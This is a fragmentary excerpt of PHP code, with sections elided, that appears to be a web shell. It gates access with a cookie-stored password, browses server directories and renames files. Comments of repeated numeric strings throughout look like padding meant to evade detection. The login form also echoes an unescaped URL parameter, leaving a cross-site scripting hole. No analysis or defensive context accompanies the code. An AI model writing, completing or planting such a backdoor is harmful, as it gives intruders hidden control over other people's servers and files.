...
$pass = false;
if (isset($_COOKIE['pw_name_88340'])) {
    if(($_COOKIE['pw_name_88340']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_88340'])) {
        if(($_POST['pw_name_88340']) == $auth_key) {
            setcookie("pw_name_88340", $_POST['pw_name_88340']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_88340' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774208027 1724682774115398 1724682774996498 1724682774529582
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774208027 1724682774115398 1724682774996498 1724682774529582
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774208027 1724682774115398 1724682774996498 1724682774529582
            $name = PATH . "/" . $_GET['r'];
